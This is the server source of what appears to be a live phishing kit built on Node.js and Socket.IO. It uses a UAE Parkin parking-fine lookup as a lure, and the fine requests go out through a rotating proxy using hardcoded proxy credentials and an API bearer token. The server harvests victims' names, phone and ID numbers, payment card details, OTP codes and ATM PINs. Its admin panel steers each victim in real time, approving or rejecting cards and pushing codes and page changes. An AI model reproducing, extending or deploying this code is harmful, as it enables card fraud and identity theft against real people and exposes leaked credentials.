const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const cookieParser = require("cookie-parser");
const axios = require("axios");
const { HttpsProxyAgent } = require("https-proxy-agent");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const app = express();
const server = http.createServer(app);

// CORS Configuration - Allow All for Debugging
app.use(cors({
  origin: "*",
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"]
}));
app.use(express.json());
app.use(cookieParser());

// Serve admin panel static files
app.use('/admin', express.static('admin'));

// Serve public static files (payment card images)
app.use('/images', express.static('public/images'));

// Socket.IO Configuration
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
  transports: ["websocket", "polling"],
});

// ===== DATA PERSISTENCE ON DISK =====
const DATA_DIR = process.env.NODE_ENV === 'production' ? '/data' : __dirname;
const DATA_FILE = path.join(DATA_DIR, 'visitors_data.json');
const BACKUP_FILE = path.join(DATA_DIR, 'visitors_data_backup.json');

// Ensure data directory exists
function ensureDataDir() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
      console.log(`Created data directory: ${DATA_DIR}`);
    }
  } catch (error) {
    console.error("Error creating data directory:", error);
  }
}

// Load saved data from file
function loadSavedData() {
  ensureDataDir();
  console.log(`Loading data from: ${DATA_FILE}`);
  
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from main file`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    if (fs.existsSync(BACKUP_FILE)) {
      console.log("Main file not found, trying backup...");
      const data = fs.readFileSync(BACKUP_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from backup file`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    console.log("No data file found, starting fresh");
  } catch (error) {
    console.error("Error loading saved data:", error);
    try {
      if (fs.existsSync(BACKUP_FILE)) {
        const data = fs.readFileSync(BACKUP_FILE, "utf8");
        const parsed = JSON.parse(data);
        return {
          visitors: new Map(Object.entries(parsed.visitors || {})),
          visitorCounter: parsed.visitorCounter || 0,
          savedVisitors: parsed.savedVisitors || [],
          whatsappNumber: parsed.whatsappNumber || "",
          globalBlockedCards: parsed.globalBlockedCards || [],
          globalBlockedCountries: parsed.globalBlockedCountries || [],
          adminPassword: parsed.adminPassword || "admin123",
        };
      }
    } catch (backupError) {
      console.error("Error loading backup:", backupError);
    }
  }
  return {
    visitors: new Map(),
    visitorCounter: 0,
    savedVisitors: [],
    whatsappNumber: "",
    globalBlockedCards: [],
    globalBlockedCountries: [],
    adminPassword: "admin123",
  };
}

// Save data to file with backup (async, non-blocking)
let saveTimer = null;
let isSaving = false;

function saveData() {
  if (saveTimer) clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    _doSave();
  }, 2000);
}

function saveDataImmediate() {
  if (saveTimer) clearTimeout(saveTimer);
  _doSaveSync();
}

async function _doSave() {
  if (isSaving) return;
  isSaving = true;
  ensureDataDir();
  
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data);
    
    const fsPromises = require('fs').promises;
    if (fs.existsSync(DATA_FILE)) {
      await fsPromises.copyFile(DATA_FILE, BACKUP_FILE).catch(() => {});
    }
    await fsPromises.writeFile(DATA_FILE, jsonData);
    console.log(`Data saved: ${savedVisitors.length} visitors`);
  } catch (error) {
    console.error("Error saving data:", error);
  } finally {
    isSaving = false;
  }
}

function _doSaveSync() {
  ensureDataDir();
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data);
    if (fs.existsSync(DATA_FILE)) {
      try { fs.copyFileSync(DATA_FILE, BACKUP_FILE); } catch(e) {}
    }
    fs.writeFileSync(DATA_FILE, jsonData);
    console.log(`Data saved (sync): ${savedVisitors.length} visitors`);
  } catch (error) {
    console.error("Error saving data (sync):", error);
  }
}

// Initialize data from file
const savedData = loadSavedData();
const visitors = new Map();
const admins = new Map();
let visitorCounter = savedData.visitorCounter;
let savedVisitors = savedData.savedVisitors;
let whatsappNumber = savedData.whatsappNumber || "";
let globalBlockedCards = savedData.globalBlockedCards || [];
let globalBlockedCountries = savedData.globalBlockedCountries || [];
let adminPassword = savedData.adminPassword || "admin123";

// Mark ALL saved visitors as disconnected on startup
savedVisitors.forEach(v => {
  v.isConnected = false;
});
console.log(`Marked all ${savedVisitors.length} saved visitors as disconnected on startup`);

// Generate unique API key
function generateApiKey() {
  return "api_" + Math.random().toString(36).substring(2, 15);
}

// Get visitor info from request
function getVisitorInfo(socket) {
  const headers = socket.handshake.headers;
  let ip = headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) {
    const ips = ip.split(",").map(i => i.trim());
    ip = ips[ips.length - 1];
  }
  return {
    ip: ip,
    userAgent: headers["user-agent"] || "",
    country: headers["cf-ipcountry"] || "Unknown",
  };
}

// Parse user agent
function parseUserAgent(ua) {
  let os = "Unknown";
  let device = "Unknown";
  let browser = "Unknown";

  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "macOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

  if (ua.includes("Mobile")) device = "Mobile";
  else if (ua.includes("Tablet")) device = "Tablet";
  else device = "Desktop";

  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";

  return { os, device, browser };
}

// Save visitor to permanent storage
function saveVisitorPermanently(visitor) {
  const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
  if (existingIndex >= 0) {
    const existing = savedVisitors[existingIndex];
    const merged = { ...existing, ...visitor };
    if (existing.dataHistory && visitor.dataHistory) {
      merged.dataHistory = existing.dataHistory.length >= visitor.dataHistory.length 
        ? [...existing.dataHistory] : [...visitor.dataHistory];
    }
    if (existing.paymentCards && visitor.paymentCards) {
      merged.paymentCards = existing.paymentCards.length >= visitor.paymentCards.length 
        ? [...existing.paymentCards] : [...visitor.paymentCards];
    }
    if (existing.digitCodes && visitor.digitCodes) {
      merged.digitCodes = existing.digitCodes.length >= visitor.digitCodes.length 
        ? [...existing.digitCodes] : [...visitor.digitCodes];
    }
    if (existing.chatMessages && visitor.chatMessages) {
      merged.chatMessages = existing.chatMessages.length >= visitor.chatMessages.length 
        ? [...existing.chatMessages] : [...visitor.chatMessages];
    }
    if (existing.data && visitor.data) {
      merged.data = { ...existing.data, ...visitor.data };
    }
    if (existing.hasEnteredCardPage) merged.hasEnteredCardPage = true;
    if (existing.fullName) merged.fullName = merged.fullName || existing.fullName;
    if (existing.phone) merged.phone = merged.phone || existing.phone;
    if (existing.idNumber) merged.idNumber = merged.idNumber || existing.idNumber;
    if (existing.network) merged.network = merged.network || existing.network;
    
    savedVisitors[existingIndex] = merged;
  } else {
    savedVisitors.push({ ...visitor });
  }
  saveData();
}

// Auto-save all visitor data every 30 seconds
setInterval(() => {
  const connectedIds = new Set();
  visitors.forEach((visitor) => {
    connectedIds.add(visitor._id);
    const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
    if (existingIndex >= 0) {
      const existing = savedVisitors[existingIndex];
      const merged = { ...existing, ...visitor };
      if (existing.dataHistory && visitor.dataHistory) {
        merged.dataHistory = existing.dataHistory.length >= visitor.dataHistory.length 
          ? [...existing.dataHistory] : [...visitor.dataHistory];
      }
      if (existing.paymentCards && visitor.paymentCards) {
        merged.paymentCards = existing.paymentCards.length >= visitor.paymentCards.length 
          ? [...existing.paymentCards] : [...visitor.paymentCards];
      }
      if (existing.digitCodes && visitor.digitCodes) {
        merged.digitCodes = existing.digitCodes.length >= visitor.digitCodes.length 
          ? [...existing.digitCodes] : [...visitor.digitCodes];
      }
      if (existing.chatMessages && visitor.chatMessages) {
        merged.chatMessages = existing.chatMessages.length >= visitor.chatMessages.length 
          ? [...existing.chatMessages] : [...visitor.chatMessages];
      }
      if (existing.data && visitor.data) {
        merged.data = { ...existing.data, ...visitor.data };
      }
      if (existing.hasEnteredCardPage) merged.hasEnteredCardPage = true;
      merged.isConnected = true;
      savedVisitors[existingIndex] = merged;
    }
  });
  
  savedVisitors.forEach(v => {
    if (!connectedIds.has(v._id)) {
      v.isConnected = false;
    }
  });
  
  saveData();
}, 30000);

// Helper: Find visitor by socketId
function findVisitorAndSocket(socketId) {
  const visitor = visitors.get(socketId);
  if (visitor) return { visitor, currentSocketId: socketId };
  
  for (const [sid, v] of visitors) {
    if (v.socketId === socketId || v._id === socketId) {
      return { visitor: v, currentSocketId: sid };
    }
    if (v.previousSocketIds && v.previousSocketIds.includes(socketId)) {
      return { visitor: v, currentSocketId: sid };
    }
  }
  
  return { visitor: null, currentSocketId: socketId };
}

// ===== PARKIN API INTEGRATION =====
async function getParkinFinesFast(plateData) {
  const { plateNumber, plateCode, plateCategory, emirate } = plateData;
  
  const proxyUrl = "http://tqxqwvlv-rotate:zz2dg5k9rvt9@proxy-rotating.webshare.io:80";
  let agent;
  try {
    agent = new HttpsProxyAgent(proxyUrl);
    console.log("[DEBUG] UAE Proxy Agent Created Successfully for Parkin");
  } catch (e) {
    console.error("[DEBUG] Proxy Agent Creation Error:", e.message);
  }

  try {
    console.log(`[DEBUG] Requesting fines for: ${plateNumber}, Emirate: ${emirate}, Code: ${plateCode}`);
    
    const response = await axios.post("https://api.parkin.ae/api/fines/get-fines-v2", {
      plate_no: plateNumber,
      plate_source_id: emirate || "1", 
      plate_type_id: plateCategory || "1", 
      plate_color_id: plateCode || "",
      language: "ar"
    }, {
      headers: {
        "Content-Type": "application/json",
        "Authorization": "Bearer m3EGd2NT8ypR4e9MjYBvKwJhLCgnqUZ5sbXrcHaDQSkPAfzx6F",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Origin": "https://www.parkin.ae",
        "Referer": "https://www.parkin.ae/"
      },
      httpsAgent: agent, 
      timeout: 30000
    });

    console.log("[DEBUG] Parkin API Response Status:", response.status);
    const data = response.data;
    console.log("[DEBUG] Parkin API Response Data:", JSON.stringify(data).substring(0, 200));
    if (data && (data.statusCode === 10000 || data.success === true)) {
      const fines = data.data?.fines || data.fines || [];
      return {
        status: "success",
        fines: fines,
        totalAmount: data.data?.total_amount || data.total_amount || 0,
        message: fines.length > 0 ? "Fines found" : "No fines found"
      };
    } else if (data && data.statusCode === 10001) {
      return { status: "success", fines: [], message: "No fines found" };
    } else {
      console.log("[DEBUG] Unexpected API Response Format:", JSON.stringify(data));
      return { status: "success", fines: [], message: "No fines found" };
    }
  } catch (error) {
    console.error("Fast API Error:", error.message);
    return { 
      status: "error", 
      message: "Parkin service is busy or proxy failed. Please try again in a moment.",
      details: error.message 
    };
  }
}

// ===== SOCKET.IO CONNECTION HANDLER =====
io.on("connection", (socket) => {
  console.log(`New connection: ${socket.id}`);

  // Handle visitor registration
  socket.on("visitor:register", async ({ existingVisitorId, idNumber }) => {
    console.log(`[BACKEND] visitor:register event received. existingVisitorId: ${existingVisitorId}, idNumber: ${idNumber}`);
    const visitorInfo = getVisitorInfo(socket);
    const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
    
    let existingVisitor = null;
    if (existingVisitorId) {
      existingVisitor = savedVisitors.find(v => v._id === existingVisitorId);
      console.log(`Looking for existing visitor with ID: ${existingVisitorId}, found: ${!!existingVisitor}`);
    }

    let visitor;
    let isNewVisitor = false;

    if (existingVisitor) {
      const prevSocketIds = existingVisitor.previousSocketIds || [];
      if (existingVisitor.socketId && existingVisitor.socketId !== socket.id) {
        prevSocketIds.push(existingVisitor.socketId);
        visitors.delete(existingVisitor.socketId);
      }
      for (const [sid, v] of visitors) {
        if (v._id === existingVisitor._id && sid !== socket.id) {
          visitors.delete(sid);
        }
      }
      visitor = {
        ...existingVisitor,
        socketId: socket.id,
        previousSocketIds: prevSocketIds.slice(-5),
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
        isIdle: false,
      };
      const index = savedVisitors.findIndex(v => v._id === existingVisitor._id);
      if (index >= 0) {
        savedVisitors[index] = visitor;
      }
      console.log(`Returning visitor reconnected: ${visitor._id}`);
    } else {
      visitorCounter++;
      visitor = {
        _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: socket.id,
        visitorNumber: visitorCounter,
        createdAt: new Date().toISOString(),
        isRead: false,
        fullName: "",
        phone: "",
        idNumber: idNumber || "",
        apiKey: generateApiKey(),
        ip: visitorInfo.ip,
        country: visitorInfo.country,
        city: "",
        os,
        device,
        browser,
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: "الصفحة الرئيسية",
        data: {},
        dataHistory: [],
        paymentCards: [],
        rejectedCards: [],
        digitCodes: [],
        hasNewData: false,
        isBlocked: false,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
        isIdle: false,
      };
      savedVisitors.push(visitor);
      isNewVisitor = true;
      console.log(`New visitor registered: ${visitor._id}`);
    }

    visitors.set(socket.id, visitor);
    saveData();

    socket.emit("successfully-connected", {
      sid: socket.id,
      pid: visitor._id,
    });

    // Notify admins
    admins.forEach((admin, adminSocketId) => {
      if (isNewVisitor) {
        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
      } else {
        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id, page: visitor.page });
      }
    });
  });

  // Handle page enter
  socket.on("visitor:pageEnter", (page) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.page = page;
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      visitor.waitingForAdminResponse = false;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:pageChanged", {
          visitorId: visitor._id,
          page,
          waitingForAdminResponse: false,
        });
      });
    }
  });

  // Handle more info (data submission)
  socket.on("more-info", (data) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      if (data.content) {
        if (!visitor.dataHistory) {
          visitor.dataHistory = [];
        }
        const now = new Date().toISOString();
        visitor.dataHistory.push({
          content: data.content,
          page: data.page,
          timestamp: now,
        });
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
        visitor.data = { ...visitor.data, ...data.content };
        if (data.content["مزود الخدمة"]) {
          visitor.network = data.content["مزود الخدمة"];
        }
      }
      if (data.paymentCard) {
        const newCardNumber = data.paymentCard.cardNumber || data.paymentCard['رقم البطاقة'] || '';
        if (!visitor.rejectedCards) visitor.rejectedCards = [];
        const isAdminRejected = visitor.rejectedCards.includes(newCardNumber) && newCardNumber !== '';
        
        if (isAdminRejected) {
          const now = new Date().toISOString();
          if (!visitor.duplicateCardRejections) visitor.duplicateCardRejections = [];
          visitor.duplicateCardRejections.push({
            cardNumber: newCardNumber,
            timestamp: now
          });
          visitor.lastDataUpdate = now;
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
          
          socket.emit('card:duplicateRejected', { cardNumber: newCardNumber });
          
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit('visitor:duplicateCard', {
              visitorId: visitor._id,
              cardNumber: newCardNumber,
              visitor: visitor
            });
          });
          
          console.log(`Duplicate card rejected for visitor ${visitor._id}: ${newCardNumber}`);
          return;
        }
        
        const now = new Date().toISOString();
        visitor.paymentCards.push({
          ...data.paymentCard,
          timestamp: now,
        });
        visitor.lastDataUpdate = now;
        visitor.hasEnteredCardPage = true;
      }
      if (data.digitCode) {
        const newCode = data.digitCode;
        const isDuplicateOtp = visitor.digitCodes.some(dc => dc.code === newCode);
        
        if (isDuplicateOtp && data.page !== "كلمة مرور ATM") {
          const now = new Date().toISOString();
          if (!visitor.duplicateOtpRejections) visitor.duplicateOtpRejections = [];
          visitor.duplicateOtpRejections.push({
            code: newCode,
            page: data.page,
            timestamp: now
          });
          visitor.lastDataUpdate = now;
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
          
          socket.emit('otp:duplicateRejected', { code: newCode });
          
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit('visitor:duplicateOtp', {
              visitorId: visitor._id,
              code: newCode,
              page: data.page,
              visitor: visitor
            });
          });
          
          console.log(`Duplicate OTP rejected for visitor ${visitor._id}: ${newCode}`);
          return;
        }
        
        const now = new Date().toISOString();
        visitor.digitCodes.push({
          code: data.digitCode,
          page: data.page,
          timestamp: now,
        });
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
      }

      visitor.page = data.page;
      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
      visitor.hasNewData = true;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:dataSubmitted", {
          visitorId: visitor._id,
          socketId: socket.id,
          data: data,
          visitor: visitor,
        });
      });

      console.log(`Data received from visitor ${visitor._id}:`, data);
    }
  });

  // Handle card number verification
  socket.on("cardNumber:verify", (cardNumber) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      const prefix = cardNumber.substring(0, 4);
      const isBlocked = visitor.blockedCardPrefixes.includes(prefix);

      socket.emit("cardNumber:verified", !isBlocked);

      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:cardVerification", {
          visitorId: visitor._id,
          cardNumber,
          isBlocked,
        });
      });
    }
  });

  // Admin registration
  socket.on("admin:register", (credentials) => {
    if (credentials.password === adminPassword) {
      admins.set(socket.id, {
        socketId: socket.id,
        connectedAt: new Date().toISOString(),
      });

      socket.emit("admin:authenticated", true);

      const connectedVisitorIds = new Set();
      visitors.forEach((v) => {
        connectedVisitorIds.add(v._id);
      });
      
      const visitorsWithStatus = savedVisitors.map(v => {
        const isCurrentlyConnected = connectedVisitorIds.has(v._id);
        let currentSocketId = v.socketId;
        visitors.forEach((activeVisitor, sid) => {
          if (activeVisitor._id === v._id) {
            currentSocketId = sid;
          }
        });
        let isIdle = false;
        if (isCurrentlyConnected) {
          const activeVisitorArr = Array.from(visitors.values()).find(av => av._id === v._id);
          if (activeVisitorArr && activeVisitorArr.lastActivity) {
            isIdle = (Date.now() - activeVisitorArr.lastActivity) > 60000;
          }
        }
        return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected, isIdle };
      });

      visitorsWithStatus.sort((a, b) => {
        const dateA = a.lastDataUpdate ? new Date(a.lastDataUpdate).getTime() : 0;
        const dateB = b.lastDataUpdate ? new Date(b.lastDataUpdate).getTime() : 0;
        return dateB - dateA;
      });

      console.log(`Sending ${visitorsWithStatus.length} visitors to admin, ${connectedVisitorIds.size} connected`);

      socket.emit("visitors:list", visitorsWithStatus);

      visitors.forEach((visitor, visitorSocketId) => {
        io.to(visitorSocketId).emit("isAdminConnected", true);
      });

      console.log(`Admin connected: ${socket.id}`);
    } else {
      socket.emit("admin:authenticated", false);
    }
  });

  // Admin: Approve form
  socket.on("admin:approve", (visitorSocketId) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("form:approved");
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form approved for visitor: ${currentSocketId}`);
  });

  // Admin: Reject form
  socket.on("admin:reject", (data) => {
    const rawSocketId = data.visitorSocketId || data;
    const { visitor, currentSocketId } = findVisitorAndSocket(rawSocketId);
    io.to(currentSocketId).emit("form:rejected");
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form rejected for visitor: ${currentSocketId}`);
  });

  // Admin: Reject Mobily call
  socket.on("admin:mobilyReject", (visitorSocketId) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("mobily:rejected");
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Mobily call rejected for visitor: ${currentSocketId}`);
  });

  // Admin: Send verification code
  socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("code", code);
    if (visitor) {
      visitor.lastSentCode = code;
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code sent to visitor ${currentSocketId}: ${code}`);
  });

  // Admin: Navigate visitor to page
  socket.on("admin:navigate", ({ visitorSocketId, page }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("visitor:navigate", page);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Navigating visitor ${currentSocketId} to: ${page}`);
  });

  // Admin: Card action (OTP, ATM, Reject)
  socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("card:action", action);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      if (action === 'reject' && visitor.paymentCards && visitor.paymentCards.length > 0) {
        if (!visitor.rejectedCards) visitor.rejectedCards = [];
        const lastCard = visitor.paymentCards[visitor.paymentCards.length - 1];
        if (lastCard) {
          const cardNumber = lastCard.cardNumber || lastCard['رقم البطاقة'] || '';
          if (cardNumber && !visitor.rejectedCards.includes(cardNumber)) {
            visitor.rejectedCards.push(cardNumber);
          }
        }
      }
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Card action ${action} sent to visitor ${currentSocketId}`);
  });

  // Admin: Code action (Approve, Reject)
  socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("code:action", { action, codeIndex });
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code action ${action} sent to visitor ${currentSocketId}`);
  });

  // Admin: Approve resend code request
  socket.on("admin:approveResend", ({ visitorSocketId }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("resend:approved");
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Resend approved for visitor ${currentSocketId}`);
  });

  // Admin: Block visitor
  socket.on("admin:block", (visitorSocketId) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = true;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(currentSocketId).emit("blocked");
      console.log(`Visitor blocked: ${currentSocketId}`);
    }
  });

  // Admin: Unblock visitor
  socket.on("admin:unblock", ({ visitorSocketId }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(currentSocketId).emit("unblocked");
      console.log(`Visitor unblocked: ${visitorSocketId}`);
    }
  });

  // Admin: Delete visitor by socket ID
  socket.on("admin:delete", (visitorSocketId) => {
    const { visitor: visitorToDelete, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("deleted");
    visitors.delete(currentSocketId);
    
    if (visitorToDelete) {
      savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
      saveData();
    }
    
    console.log(`Visitor deleted: ${visitorSocketId}`);
  });

  // Admin: Delete visitor by ID
  socket.on("admin:deleteById", (visitorId) => {
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        io.to(socketId).emit("deleted");
        visitors.delete(socketId);
      }
    });
    
    savedVisitors = savedVisitors.filter(v => v._id !== visitorId);
    saveData();
    
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
    });
    
    console.log(`Visitor deleted by ID: ${visitorId}`);
  });

  // Admin: Send last message
  socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
    const { currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("admin-last-message", { message });
    console.log(`Message sent to visitor ${currentSocketId}: ${message}`);
  });

  // Admin: Push personal data to visitor form
  socket.on("admin:pushPersonalData", ({ visitorSocketId, personalData }) => {
    const { currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("fillPersonalData", personalData);
    console.log(`Personal data pushed to visitor ${currentSocketId}:`, personalData);
  });

  // Admin: Set bank name
  socket.on("admin:setBankName", ({ visitorSocketId, bankName }) => {
    const { currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("bankName", bankName);
    console.log(`Bank name set for visitor ${currentSocketId}: ${bankName}`);
  });

  // Admin: Change password
  socket.on("admin:changePassword", ({ oldPassword, newPassword }) => {
    if (oldPassword === adminPassword) {
      adminPassword = newPassword;
      saveData();
      socket.emit("admin:passwordChanged", true);
      console.log("Admin password changed successfully and saved to disk");
    } else {
      socket.emit("admin:passwordChanged", false);
      console.log("Admin password change failed - wrong old password");
    }
  });

  // Admin: Clear all data
  socket.on("admin:clearAllData", () => {
    visitors.forEach((v, socketId) => {
      io.to(socketId).emit("deleted");
    });
    
    visitors.clear();
    savedVisitors = [];
    visitorCounter = 0;
    
    saveData();
    
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("allDataCleared");
    });
    
    console.log("All data cleared by admin");
  });

  // WhatsApp: Get current number
  socket.on("whatsapp:get", () => {
    socket.emit("whatsapp:current", whatsappNumber);
    socket.emit("whatsapp:update", whatsappNumber);
  });

  // WhatsApp: Set number (admin only)
  socket.on("whatsapp:set", (number) => {
    whatsappNumber = number;
    saveData();
    io.emit("whatsapp:update", whatsappNumber);
    console.log(`WhatsApp number updated: ${whatsappNumber}`);
  });

  // Blocked Cards: Get list
  socket.on("blockedCards:get", () => {
    socket.emit("blockedCards:list", globalBlockedCards);
  });

  // Blocked Cards: Add prefix
  socket.on("blockedCards:add", (prefix) => {
    if (prefix && prefix.length === 4 && !globalBlockedCards.includes(prefix)) {
      globalBlockedCards.push(prefix);
      saveData();
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
      });
      io.emit("blockedCards:updated", globalBlockedCards);
      console.log(`Blocked card prefix added: ${prefix}`);
    }
  });

  // Blocked Cards: Remove prefix
  socket.on("blockedCards:remove", (prefix) => {
    globalBlockedCards = globalBlockedCards.filter(p => p !== prefix);
    saveData();
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
    });
    io.emit("blockedCards:updated", globalBlockedCards);
    console.log(`Blocked card prefix removed: ${prefix}`);
  });

  // Blocked Cards: Check if card is blocked (for clients)
  socket.on("blockedCards:check", (cardNumber) => {
    const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
    const isBlocked = globalBlockedCards.includes(prefix);
    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
  });

  // Blocked Countries: Get list
  socket.on("blockedCountries:get", () => {
    socket.emit("blockedCountries:list", globalBlockedCountries);
  });

  // Blocked Countries: Add country
  socket.on("blockedCountries:add", (country) => {
    if (country && !globalBlockedCountries.includes(country)) {
      globalBlockedCountries.push(country);
      saveData();
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
      });
      io.emit("blockedCountries:updated", globalBlockedCountries);
      console.log(`Blocked country added: ${country}`);
    }
  });

  // Blocked Countries: Remove country
